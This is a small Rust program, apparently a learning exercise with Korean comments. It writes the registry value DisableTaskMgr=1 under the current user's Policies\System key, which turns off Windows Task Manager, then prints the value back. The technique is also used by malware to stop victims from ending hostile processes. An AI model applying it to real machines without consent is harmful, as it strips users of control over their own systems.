use std::io; //입력 및 출력 수행시 일반적 사항 포함 모듈
use std::path::Path; // 경로 검사를 위한 작업 지원 모듈
use winreg::RegKey; //MS Windows 레지스트리에 액세스 하기 위한 크레이트
use winreg::enums::*; //MS Windows 레지스트리에 액세스 하기 위한 크레이트

fn main() -> io::Result<()>{
	
    let hkcu = RegKey::predef(HKEY_CURRENT_USER); //작업 관리자 설정 가능한 레지스터리 키

	let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies").join("System"); // 하위 키 System 생성 경로 정의
	let (_key, _disp) = hkcu.create_subkey(&path).unwrap(); //지정된 경로 삽입 후 하위 키 System 생성

	_key.set_value("DisableTaskMgr",&1u32).unwrap(); // DisableTaskMgr라는 이름의 Dword (32bit) 값 생성 후 1로 설정 
	let dword_var:u32 = _key.get_value("DisableTaskMgr").unwrap(); //print를 통해 값 확인 위한 변수 정의
	println!("DisableTaskMgr={}", dword_var); // 설정 값 확인 출력 (관리자 권한으로 직접 실행파일 실행할수 밖에 없어서 출력 안뜸.)
	
	Ok(())
}